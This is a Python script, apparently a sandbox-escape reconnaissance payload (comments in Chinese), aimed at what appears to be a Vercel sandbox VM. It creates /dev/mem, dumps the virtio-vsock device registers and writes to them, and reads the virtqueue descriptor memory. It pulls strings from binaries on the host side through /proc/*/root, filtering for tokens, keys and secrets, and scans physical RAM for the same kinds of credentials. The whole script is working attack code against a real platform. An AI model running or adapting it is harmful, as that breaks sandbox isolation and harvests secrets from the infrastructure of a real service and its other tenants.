# -*- coding: utf-8 -*-
"""v102 payload: virtio3(vsock) 配置空间全量 + 队列定位 + 写验证 + 宿主二进制 strings
M1 virtio3 0x0-0x100 全量 dump + 写 QueueSel 验证
M2 vsock config 区 (guest_cid) + 队列地址
M3 宿主二进制 strings: sandboxctrl/celld/sandbox-init 路由/URL/关键字
M4 guest RAM 低端快速扫描
输出 /vercel/sandbox/v102c.out"""
import os, socket, struct, time, subprocess, glob, signal, ctypes, re

OUT = '/vercel/sandbox/v102c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=8):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return (r.stdout or b'') + (r.stderr or b'')
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()


libc = ctypes.CDLL(None, use_errno=True)
libc.open.restype = ctypes.c_int
libc.open.argtypes = [ctypes.c_char_p, ctypes.c_int]
libc.mmap.restype = ctypes.c_void_p
libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
PROT_RW = 3
MAP_SHARED = 1
memfd = -1


def memmap(off, size=0x1000):
    m = libc.mmap(None, size, PROT_RW, MAP_SHARED, memfd, off)
    if m in (ctypes.c_void_p(-1).value, 0):
        return None
    return m


def u32(m, off):
    return ctypes.c_uint32.from_address(m + off).value


def u16(m, off):
    return ctypes.c_uint16.from_address(m + off).value


def w32(m, off, v):
    ctypes.c_uint32.from_address(m + off).value = v


# ---------- M1 virtio3 全量 dump ----------
log('=== M1 virtio3(vsock) config ===')
log('mknod: ' + sh('mknod /dev/mem c 1 1 2>&1; ls /dev/mem').decode(errors='replace')[:100])
memfd = libc.open(b'/dev/mem', 2)
log('mem fd=%d' % memfd)
m3 = memmap(0xc0004000)
if m3:
    for off in range(0, 0x100, 4):
        log('vsock+0x%02x: %08x' % (off, u32(m3, off)))
    # 写验证: QueueSel=0 写回读
    w32(m3, 0x20, 0)  # modern: 0x20 = QueueSel
    time.sleep(0.05)
    log('QueueSel=0 -> QueueNumMax=0x%x QueueNum=0x%x QueueReady=0x%x' % (u16(m3, 0x22), u16(m3, 0x24), u16(m3, 0x26)))
    w32(m3, 0x20, 1)
    time.sleep(0.05)
    log('QueueSel=1 -> QueueNumMax=0x%x QueueNum=0x%x QueueReady=0x%x' % (u16(m3, 0x22), u16(m3, 0x24), u16(m3, 0x26)))
    w32(m3, 0x20, 2)
    time.sleep(0.05)
    log('QueueSel=2 -> QueueNumMax=0x%x QueueNum=0x%x QueueReady=0x%x' % (u16(m3, 0x22), u16(m3, 0x24), u16(m3, 0x26)))
    # 队列 desc/driver/device 地址 (modern 0x30-0x44)
    log('Q0 desc_lo=0x%x desc_hi=0x%x drv_lo=0x%x drv_hi=0x%x dev_lo=0x%x dev_hi=0x%x' % (
        u32(m3, 0x30), u32(m3, 0x34), u32(m3, 0x38), u32(m3, 0x3c), u32(m3, 0x40), u32(m3, 0x44)))
    # config 区 (modern 0x60+)
    log('config 0x60: %08x %08x %08x %08x' % (u32(m3, 0x60), u32(m3, 0x64), u32(m3, 0x68), u32(m3, 0x6c)))
    log('config 0x70: %08x %08x %08x %08x' % (u32(m3, 0x70), u32(m3, 0x74), u32(m3, 0x78), u32(m3, 0x7c)))
    # device status
    log('status=0x%x' % u32(m3, 0x50))
    ctypes.CDLL(None).munmap(m3, 0x1000)

# ---------- M2 读队列内存 (如果 desc 地址非零) ----------
log('=== M2 queue mem ===')
# 重新读 desc 地址
m3 = memmap(0xc0004000)
if m3:
    desc_lo = u32(m3, 0x30)
    desc_hi = u32(m3, 0x34)
    ctypes.CDLL(None).munmap(m3, 0x1000)
    if desc_lo or desc_hi:
        qaddr = (desc_hi << 32) | desc_lo
        log('desc phys=0x%x' % qaddr)
        for pg in range(0, 16):
            mq = memmap(qaddr + pg * 0x1000)
            if not mq:
                log('q page %d mmap FAIL' % pg)
                break
            # desc 表 16B/项: addr(8) len(4) flags(2) next(2)
            out = []
            for i in range(16):
                a = ctypes.c_uint64.from_address(mq + i * 16).value
                ln = ctypes.c_uint32.from_address(mq + i * 16 + 8).value
                fl = ctypes.c_uint16.from_address(mq + i * 16 + 12).value
                if a or ln:
                    out.append('%d:a=%x l=%x f=%x' % (i, a, ln, fl))
            log('desc page %d: %s' % (pg, '; '.join(out)[:400]))
            ctypes.CDLL(None).munmap(mq, 0x1000)
            if not out:
                break
    else:
        log('desc addr is 0 (legacy layout?)')

# ---------- M3 宿主二进制 strings ----------
log('=== M3 host bin strings ===')
paths = ['/proc/535/root/opt/vercel/sandboxctrl', '/proc/1/root/opt/vercel/celld',
         '/proc/1/root/run/vercel/share/sandbox-init']
for binp in paths:
    log('--- %s ---' % binp)
    r = sh('ls -la %s 2>&1; strings %s 2>/dev/null | grep -aiE "http|/v[0-9]+/|/api|unix|vsock|spawn|exec|sandbox|23456|/run/|sock|listen|addr|token|key|secret" | sort -u | head -60' % (binp, binp), t=12)
    r2 = r.decode(errors='replace')
    for ln in r2.splitlines():
        if ln.strip():
            log('  ' + ln[:220])


# ---------- M4 低端 RAM 扫描 ----------
log('=== M4 low RAM scan ===')
for base in [0x100000, 0x1000000, 0x10000000]:
    m = memmap(base, 0x1000)
    if not m:
        log('scan @0x%x FAIL' % base)
        continue
    data = ctypes.string_at(m, 0x1000)
    strs = re.findall(rb'[ -~]{6,}', data)
    interesting = [s.decode() for s in strs if any(k in s.lower() for k in (b'vercel', b'ec2', b'key', b'token', b'secret', b'containerd', b'cell', b'celld'))]
    if interesting:
        log('RAM@0x%x: %s' % (base, '; '.join(interesting[:20])))
    ctypes.CDLL(None).munmap(m, 0x1000)

log('V102C_DONE')
f.close()
